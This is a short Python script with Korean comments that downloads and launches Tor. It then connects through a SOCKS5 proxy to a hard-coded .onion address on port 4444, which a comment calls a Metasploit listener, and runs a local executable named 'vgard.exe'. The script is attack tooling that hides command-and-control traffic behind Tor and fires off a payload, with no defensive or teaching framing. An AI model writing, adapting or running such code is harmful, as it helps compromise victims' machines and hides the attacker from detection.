import os
import subprocess
import time
import urllib.request
import zipfile
import socket
import socks
import shutil

# Tor Browser 다운로드 URL
tor_url = 'https://www.torproject.org/dist/torbrowser/10.0.16/tor-win32-0.4.5.7.zip'
tor_path = 'tor-win32-0.4.5.7.zip'
tor_dir = 'tor'

# Tor Browser 다운로드 및 압축 해제
if not os.path.exists(tor_dir):
    urllib.request.urlretrieve(tor_url, tor_path)
    with zipfile.ZipFile(tor_path, 'r') as zip_ref:
        zip_ref.extractall(tor_dir)

# Tor 실행
tor_exe = os.path.join(tor_dir, 'Tor', 'tor.exe')
tor_process = subprocess.Popen([tor_exe])

# Tor가 실행될 때까지 대기
time.sleep(30)

# SOCKS5 프록시 설정
socks5_host = '127.0.0.1'
socks5_port = 9150

# Metasploit Listener 연결 설정
onion_address = 'eubw6taemp4wg6ghsppt6cjxmruqh2b5u6ouqd2wc6qcemgciz3lkdid.onion'
onion_port = 4444

# 소켓 설정
s = socks.socksocket()
s.set_proxy(socks.SOCKS5, socks5_host, socks5_port)

try:
    s.connect((onion_address, onion_port))
    payload_exe = 'vgard.exe'
    os.system(payload_exe)
finally:
    # Tor 프로세스 종료
    tor_process.terminate()
